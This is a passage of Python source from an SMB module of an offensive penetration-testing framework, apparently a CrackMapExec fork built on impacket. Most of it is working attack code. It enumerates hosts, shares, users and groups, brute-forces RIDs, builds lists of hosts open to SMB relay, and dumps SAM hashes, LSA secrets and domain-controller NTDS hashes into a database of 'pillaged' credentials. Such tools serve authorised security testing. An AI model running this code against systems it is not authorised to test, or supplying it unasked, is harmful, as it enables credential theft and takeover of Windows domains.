                results.append(rpc._wmi_connection.ExecQuery(queryStr, lFlags=impacket.dcerpc.v5.dcom.wmi.WBEM_FLAG_FORWARD_ONLY))

        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))
            return records


        for result in results:
            while True:
                try:
                    wmi_results = result.Next(0xffffffff, 1)[0]
                    record2 = wmi_results.getProperties()
                    records2.append(record2)

                    for k, v in record2.items():
                        self.logger.highlight('{} => {}'.format(k, v['value']))
                    self.logger.highlight('')

                except Exception as e:
                    if str(e).find('S_FALSE') < 0:
                        raise e
                    else:
                        break

        return records

#########################


###############################################################################

#     # #######  #####  #######       ####### #     # #     # #     #
#     # #     # #     #    #          #       ##    # #     # ##   ##
#     # #     # #          #          #       # #   # #     # # # # #
####### #     #  #####     #    ##### #####   #  #  # #     # #  #  #
#     # #     #       #    #          #       #   # # #     # #     #
#     # #     # #     #    #          #       #    ## #     # #     #
#     # #######  #####     #          ####### #     #  #####  #     #

###############################################################################
###############################################################################
#    Host Enum Functions
#
# This section:
#   enum_host_info
#   disks
#   sessions
#   loggedon
#   local_users
#   local_groups
#   rid_brute
#   spider
# (fold next line)
####################################################################################

    def enum_host_info(self):
        """Fingerprint host via smb connection.

        Grabs info prior to unauthenticated
        """
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login('', '')
            logging.debug("Null login?")
            self.logger.success('Null login allowed')
        except impacket.smbconnection.SessionError as e:
            if "STATUS_ACCESS_DENIED" in str(e):
                pass

        self.domain     = self.conn.getServerDomain()           # OCEAN
        self.hostname   = self.conn.getServerName()             # WIN7-PC
        self.server_os  = self.conn.getServerOS()               # WIndows 6.1 Build 7601
        self.signing    = self.conn.isSigningRequired()         # True/false
        self.os_arch    = self.get_os_arch()                    # 64
        self.domain_dns = self.conn.getServerDNSDomainName()    # ocean.depth

        self.logger.hostname = self.hostname
        dialect = self.conn.getDialect()

        #print (self.conn.getServerDomain())            # OCEAN
        #print (self.conn.getServerName())              # WIN7-PC
        #print (self.conn.getServerOS())                # WIndows 6.1 Build 7601
        #print (self.conn.isSigningRequired())          # True
        #print (self.get_os_arch())                     # 64
        #print (self.conn.getDialect())                 # 528
        #print (self.conn.getRemoteHost())              # IPaddress
        #print (self.conn.getRemoteName())              # win7-pc
        #print (self.conn.getServerDNSDomainName())     # ocean.depth
        #print (self.conn.getServerOSMajor())           # 6
        #print (self.conn.getServerOSMinor())           # 1
        #print (self.conn.getServerOSBuild())           # 7601
        #print (self.conn.doesSupportNTLMv2())          # True
        #print (self.conn.isLoginRequired())            # True

        if dialect == impacket.smb.SMB_DIALECT:
            self.smbv = '1'
            logging.debug("SMBv1 dialect used")
        elif dialect == impacket.smb3structs.SMB2_DIALECT_002:
            self.smbv = '2.0'
            logging.debug("SMBv2.0 dialect used")
        elif dialect == impacket.smb3structs.SMB2_DIALECT_21:
            self.smbv = '2.1'
            logging.debug("SMBv2.1 dialect used")
        else:
            self.smbv = '3.0'
            logging.debug("SMBv3.0 dialect used")

        # Get the DC if we arent local-auth and didnt specify
        if not self.args.local_auth and self.dc_ip == '':
            self.dc_ip = self.conn.getServerDNSDomainName()

        if self.args.domain:
            self.domain = self.args.domain

        if not self.domain:
            self.domain = self.hostname

        self.db.add_computer(self.host, self.hostname, self.domain, self.server_os)


        try:
            ''' DC's seem to want us to logoff first, windows workstations sometimes reset the connection
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.local_auth:
            self.domain = self.hostname

        self.output_filename = '{}/{}_{}_{}'.format(cfg.LOGS_PATH,self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S"))
        #Re-connect since we logged off
        self.create_conn_obj()



    def disks(self):
        from cmx.protocols.smb.ENUM.hostenum import disks1
        disks1(self)

        return


    def sessions(self):
        from cmx.protocols.smb.ENUM.hostenum import sessions1
        sessions1(self)

        return   

    def loggedon(self):
        from cmx.protocols.smb.ENUM.hostenum import loggedon1
        loggedon1(self)

        return


    def local_users(self):
        from cmx.protocols.smb.ENUM.hostenum import local_users1
        local_users1(self)

        return


    def local_groups(self):
        from cmx.protocols.smb.ENUM.hostenum import local_groups1
        local_groups1(self)

        return


    def rid_brute(self, maxrid=None):
        from cmx.protocols.smb.ENUM.hostenum import rid_brute1
        rid_brute1(self, maxrid)

        return


    def spider(self, share=None, folder='.', pattern=[], regex=[], exclude_dirs=[], depth=None, content=False, onlyfiles=True):
        from cmx.protocols.smb.ENUM.hostenum import spider1
        spider1(self, share, folder, pattern, regex, exclude_dirs, depth, content, onlyfiles)

        return

    def shares2(self): #session error not defined?
        from cmx.protocols.smb.ENUM.hostenum import shares1
        shares1(self)

        return


    def shares(self):
        """Enum accessable shares and privileges.

        Prints output
        """
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        permissions = []
        #self.logger.announce('Starting Share Enumeration')

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False

                try:
                    self.conn.listPath(share_name, '\\')
                    read = True
                    share_info['access'].append('READ')
                except impacket.smbconnection.SessionError:
                    pass

                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info['access'].append('WRITE')
                except impacket.smbconnection.SessionError:
                    pass

                permissions.append(share_info)
                #self.db.add_share(hostid, share_name, share_remark, read, write)

            #self.logger.debug('Enumerated shares')
            self.logger.success('Shares enumerated on: {}'.format(self.host))

            self.logger.highlight('{:<15} {:<15} {}'.format('Share', 'Permissions', 'Remark'))
            self.logger.highlight('{:<15} {:<15} {}'.format('-----', '-----------', '------'))
            for share in permissions:
                name   = share['name']
                remark = share['remark']
                perms  = share['access']

                self.logger.highlight('{:<15} {:<15} {}'.format(name, ','.join(perms), remark))

        except Exception as e:
            self.logger.error('Error enumerating shares: {}'.format(e))

        #self.logger.announce('Finished Share Enumeration')
        return permissions



###############################################################################

     #     # ####### #######        ####### #     # #     # #     # 
     ##    # #          #           #       ##    # #     # ##   ## 
     # #   # #          #           #       # #   # #     # # # # # 
     #  #  # #####      #    #####  #####   #  #  # #     # #  #  # 
     #   # # #          #           #       #   # # #     # #     # 
     #    ## #          #           #       #    ## #     # #     # 
     #     # #######    #           ####### #     #  #####  #     # 


###############################################################################
###############################################################################
#   Network/Domain Enum functions
#
# This section:
#   pass_pol
#   groups
#   users
#   computers
# (fold next line)
###############################################################################

    @requires_dc
    def users(self):
        from cmx.protocols.smb.ENUM.domainenum import users1
        users1(self)

        return

    @requires_dc
    def groups(self):
        from cmx.protocols.smb.ENUM.domainenum import group1
        group1(self)

        return

    @requires_dc
    def computers(self):
        from cmx.protocols.smb.ENUM.domainenum import computers1
        computers1(self)

        return

    @requires_dc
    def group(self):
        from cmx.protocols.smb.ENUM.domainenum import group2
        group2(self)

        return


    def pass_pol(self):
        """Grab domain password policy."""
        return PassPolDump(self).dump()



##############################################################################

######  #     # #     # ######      #####  ######  ####### ######   #####
#     # #     # ##   ## #     #    #     # #     # #       #     # #     #
#     # #     # # # # # #     #    #       #     # #       #     # #
#     # #     # #  #  # ######     #       ######  #####   #     #  #####
#     # #     # #     # #          #       #   #   #       #     #       #
#     # #     # #     # #          #     # #    #  #       #     # #     #
######   #####  #     # #           #####  #     # ####### ######   #####

##############################################################################
####################################################################################
#   Extracting Creds functions
#
# This section:
#   sam
#   lsa
#   ntds
# (fold next line)
####################################################################################

    @requires_admin
    def sam(self):
        """Extract hashes from SAM.

        Uses secretsdump
        """
        self.logger.announce('Dumping SAM hashes on {}'.format(self.host))

        self.enable_remoteops()
        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_sam_hash(sam_hash, host_id):
            add_sam_hash.sam_hashes += 1
            self.logger.highlight(sam_hash)
            username, _, lmhash, nthash, _, _, _ = sam_hash.split(':')
            self.db.add_credential('hash', self.hostname, username, ':'.join((lmhash, nthash)), pillaged_from=host_id)
        add_sam_hash.sam_hashes = 0

        if self.remote_ops and self.bootkey:
            #try:
            SAMFileName = self.remote_ops.saveSAM()
            self.logger.success('SAM hashes dump of {}'.format(self.host))
            SAM = impacket.examples.secretsdump.SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, host_id))

            #self.logger.announce('Dumping SAM hashes')
            SAM.dump()
            SAM.export(self.output_filename)

            self.logger.success('Added {} SAM hashes to the database'.format(highlight(add_sam_hash.sam_hashes)))
            self.logger.success('Saved {} hashes to {}.sam'.format(highlight(add_sam_hash.sam_hashes),
                                                                             self.output_filename))

            #except Exception as e:
                #self.logger.error('SAM hashes extraction failed: {}'.format(e))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            SAM.finish()


    @requires_admin
    def lsa(self):
        """Extract LSA Secrets.

        Some reading on DCC2 ~ cached credentials.
        -https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)#windows-logon-cached-password-verifiers
        -https://support.microsoft.com/en-us/help/913485/cached-credentials-security-in-windows-server-2003-in-windows-xp-and-i
            tldr;
            DCC's are password "verifiers" used to locally verify a password is good.
            These cant be used (passed) to other machines as they are not really a password.

        still dont know about this, some can be cracked.
        https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
        """
        self.logger.announce('Dumping LSA Secrets on {}'.format(self.host))
        self.enable_remoteops()

        def add_lsa_secret(secret):
            add_lsa_secret.secrets += 1
            self.logger.highlight(secret)
        add_lsa_secret.secrets = 0

        if self.remote_ops and self.bootkey:

            SECURITYFileName = self.remote_ops.saveSECURITY()
            self.logger.success('LSA Secrets dump for {}'.format(self.host))

            LSA = impacket.examples.secretsdump.LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
                             perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))

            #self.logger.success('Dumping LSA secrets')
            LSA.dumpCachedHashes()
            LSA.exportCached(self.output_filename)
            LSA.dumpSecrets()
            LSA.exportSecrets(self.output_filename)

            self.logger.success('Saved {} LSA secrets to {}.secrets'.format(highlight(add_lsa_secret.secrets),
                                                                            self.output_filename))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            LSA.finish()

    @requires_admin
    def ntds(self):
        """Extract hashes from ntds on a DC.

        Can pull history and if accounts are enabled or not, depending on command-line args passed
        """
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName   = None

        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            """Add ntds hash to db."""
            add_ntds_hash.ntds_hashes += 1
            self.logger.highlight(ntds_hash)
            if ntds_hash.find('$') == -1:
                if ntds_hash.find('\\') != -1:
                    domain, hash = ntds_hash.split('\\')
                else:
                    domain = self.domain
                    hash = ntds_hash

                try:
                    username, _, lmhash, nthash, _, _, _ = hash.split(':')
                    parsed_hash = ':'.join((lmhash, nthash))
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except:
                    logging.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                logging.debug("Dumped hash is a computer account, not adding to db")
        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0


        if self.remote_ops and self.bootkey:
            try:
                if self.args.ntds is 'vss':
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

                NTDS = impacket.examples.secretsdump.NTDSHashes(NTDSFileName, self.bootkey, isRemote=True,
                                history=self.args.ntds_history, noLMHash=True,
                                remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=True,
                                pwdLastSet=self.args.ntds_pwdLastSet, resumeSession=None, outputFileName=self.output_filename,
                                justUser=None, printUserStatus=self.args.ntds_status,
                                perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))

                self.logger.success('Starting NTDS Dump, prepare yourself')

                NTDS.dump()

                self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds',
                                                                                                                highlight(add_ntds_hash.added_to_db)))

            except Exception as e:
                #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                #    resumeFile = NTDS.getResumeSessionFile()
                #    if resumeFile is not None:
                #        os.unlink(resumeFile)
                self.logger.error(e)

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            NTDS.finish()


#    def dcsync(self):
#        try:
#            stringBinding = r'ncacn_ip_tcp:{}[445]'.format(self.dc_ip)
#            transport = impacket.dcerpc.v5.transport.DCERPCTransportFactory(stringBinding)
#            transport.set_connect_timeout(5)
#            dce = transport.get_dce_rpc()
#            dce.connect()
#            try:
#                dce.bind(MSRPC_UUID_DRSUAPI)
#                try:
#                    resp = samr.hSamrLookupDomainInSamServer(dce)
#                    if self.debug:
#                        resp.dump()
#                    domain_sid = resp['DomainId']
#                    try:
#                        resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
#                        logging.debug('Dump of hSamrOpenDomain response:')
#                        if self.debug:
#                            resp.dump()
#                        domainHandle = resp['DomainHandle']
#
#                    except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
#                        logging.debug('a {}'.format(str(e)))
#                        dce.disconnect()
#                        pass
#                except DCERPCException as e:
#                    logging.debug('b {}'.format(str(e)))
#                    dce.disconnect()
#                    pass
#            except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
#                logging.debug('c {}'.format(str(e)))
#                dce.disconnect()
#                pass
#        except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
#            logging.debug('c {}'.format(str(e)))
#            dce.disconnect()
#            pass



####################################################################################
####################################################################################

    #     #    #######    #          ######     #######    ######      #####
    #     #    #          #          #     #    #          #     #    #     #
    #     #    #          #          #     #    #          #     #    #
    #######    #####      #          ######     #####      ######      #####
    #     #    #          #          #          #          #   #            #
    #     #    #          #          #          #          #    #     #     #
    #     #    #######    #######    #          #######    #     #     #####

####################################################################################
#   Helper / Misc functions
#
# This section:
#   print_host_info
#   get_os_arch
#   check_if_admin
#   enable_remoteops
#   get_dc_ips
#   domainfromdsn
#   gen_relay_list
#
# (fold next line)
####################################################################################

    def print_host_info(self):
        """Format help for host info."""
        self.logger.announce("{}{} (domain:{}) (signing:{}) (SMBv:{})".format(self.server_os,
                                                                              ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                                              self.domain,
                                                                              self.signing,
                                                                              self.smbv))

    def get_os_arch(self):
        """Identify OS architecture.

        Returns either 32 or 64
        """
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            rpctransport = impacket.dcerpc.v5.transport.DCERPCTransportFactory(stringBinding)
            rpctransport.set_connect_timeout(5)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(impacket.dcerpc.v5.epm.MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {} using x64'.format(self.host, str(e)))

        try:
            dce.disconnect()
        except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
            pass

        return 64


    def check_if_admin(self):
        """Check for localadmin privs.

        Checked by view all services for sc_manager_all_access
        Returns:
            True if localadmin
            False if not localadmin
        """
        try:
            rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\svcctl', smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('localadmin Binding start')
                dce.bind(impacket.dcerpc.v5.scmr.MSRPC_UUID_SCMR)
                try:
                    # 0xF003F - SC_MANAGER_ALL_ACCESS
                    # this val comes from https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights
                    # https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/scmr.py

                    logging.debug('Verify localadmin via ServicesActive...')
                    ans = impacket.dcerpc.v5.scmr.hROpenSCManagerW(dce, '{}\x00'.format(self.hostname),'ServicesActive\x00', 0xF003F)
                    logging.debug('pewpewpewPwned baby')
                    dce.disconnect()
                    return True
                except impacket.dcerpc.v5.rpcrt.DCERPCException:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
                logging.debug('b {}'.format(str(e)))
                dce.disconnect()
                return False
        except Exception:
            logging.debug('Something went wrong ... Not localadmin :( ')
            dce.disconnect()
            return False

        dce.disconnect()
        return False


    def enable_remoteops(self):
        """Enable remote operations on a target host."""
        if self.remote_ops is not None and self.bootkey is not None:
            return

        try:
            self.remote_ops = impacket.examples.secretsdump.RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.error('RemoteOperations failed: {}'.format(e))


    def get_dc_ips(self):
        """

        Args:

        Raises:

        Returns:

        """
        dc_ips = []

        #for dc in self.db.get_domain_controllers(domain=self.domain):
        #    dc_ips.append(dc[1])

        if self.args.domaincontroller:
            dc_ips.append(self.args.domaincontroller)

        if self.args.domain:
            if not self.args.domaincontroller:
                dc_ips.append(self.args.domain.upper())

        return dc_ips


    def domainfromdsn(self, dsn):
        """

        Args:

        Raises:

        Returns:

        """
        dsnparts = dsn.split(',')
        domain = ""
        for part in dsnparts:
            k,v = part.split("=")
            if k == "DC":
                if domain=="":
                    domain = v
                else:
                    domain = domain+"."+v
        return domain


    def gen_relay_list(self):
        """Generate a list of hosts that can be relayed too.

        Checks for smb signing on hosts to determine if relay would be possible.
        Outputs:
            File, name passed in after the option
        """
        if self.server_os.lower().find('windows') != -1 and self.signing is False:
            with sem:
                with open(self.args.gen_relay_list, 'a+') as relay_list:
                    if self.host not in relay_list.read():
                        relay_list.write(self.host + '\n')


###############################################################################
###############################################################################

# Grouped Commands aka SuperFunctions

###############################################################################
###############################################################################

    @requires_admin
    @requires_dc
    def all(self):
        """Run all enum commands and dump sam.

        Testing/debugging Function to execute multiple enum functions in one shot
        """
        print('')
        self.logger.announce("Running sessions,loggedon,rid-brute,disks,shares,local+domain users/groups/computers, and dumping SAM")
        print('')

        self.sessions()
        time.sleep(1)

        self.loggedon()
        time.sleep(1)

        self.local_users()
        time.sleep(1)

        self.local_groups()
        time.sleep(1)

        self.rid_brute(maxrid=4000)
        time.sleep(1)

        self.disks()
        time.sleep(1)

        self.shares()
        time.sleep(1)

        self.users()
        time.sleep(1)

        self.groups()
        time.sleep(1)

        self.computers()
        time.sleep(1)

        self.args.group = 'Domain Admins'
        self.group()
        time.sleep(1)

        self.sam()

        print('')
        self.logger.announce("Did it work?")


    def hostrecon(self):
        """Execute all host recon commands.

        Sessions,loggedon,rid-brute,disks,local users, local groups
        """
        print('')
        self.logger.announce("Running All Host Recon Commands - ")
        self.logger.announce("sessions,loggedon,rid-brute,disks,local users, local groups")
        print('')

        self.sessions()
        time.sleep(1)
        print('')

        self.loggedon()
        time.sleep(1)
        print('')

        self.local_users()
        time.sleep(1)
        print('')

        self.local_groups()
        time.sleep(1)
        print('')

        self.rid_brute(maxrid=4000)
        time.sleep(1)
        print('')

        self.disks()
        time.sleep(1)
        print('')

        self.shares()
        time.sleep(1)

        print('')
        self.logger.announce("Host Recon Complete")


    @requires_dc
    def netrecon(self):
        """Run all network/domain recon commands.

        domain users/groups/computers, DA's, EA's"
        """
        print('')
        self.logger.announce("Running All Network Recon Commands -")
        self.logger.announce("domain users/groups/computers, DA's, EA's")
        print('')

        self.users()
        time.sleep(1)
        print('')

        self.groups()
        time.sleep(1)
        print('')

        self.computers()
        time.sleep(1)
        print('')

        self.args.group = 'Enterprise Admins'
        self.group()
        time.sleep(1)
        print('')

        self.args.group = 'Domain Admins'
        self.group()
        time.sleep(1)

        print('')
        self.logger.announce("Network Recon Complete, the DB is now populated")


    @requires_dc
    def recon(self):
        """Run all recon commands.

        sessions,loggedon,ridbrute,disks,shares,local+dom users/groups/computers
        """
        print('')
        self.logger.announce("Running Host and Network Recon Commands: ")
        self.logger.announce("sessions,loggedon,ridbrute,disks,shares,local+dom users/groups/computers")
        print('')

        self.sessions()
        time.sleep(1)
        print('')

        self.loggedon()
        time.sleep(1)
        print('')

        self.local_users()
        time.sleep(1)
        print('')

        self.local_groups()
        time.sleep(1)
        print('')

        self.rid_brute(maxrid=4000)
        time.sleep(1)
        print('')

        self.disks()
        time.sleep(1)
        print('')

        self.shares()
        time.sleep(1)
        print('')

        self.users()
        time.sleep(1)
        print('')

        self.groups()
        time.sleep(1)
        print('')

        self.computers()
        time.sleep(1)
        print('')

        self.args.group = 'Domain Admins'
        self.group()
        time.sleep(1)
        print('')

        self.args.group = 'Domain Controllers'
        self.group()
        time.sleep(1)

        print('')
        self.logger.announce("Host + Network Recon Complete, the DB is now populated")
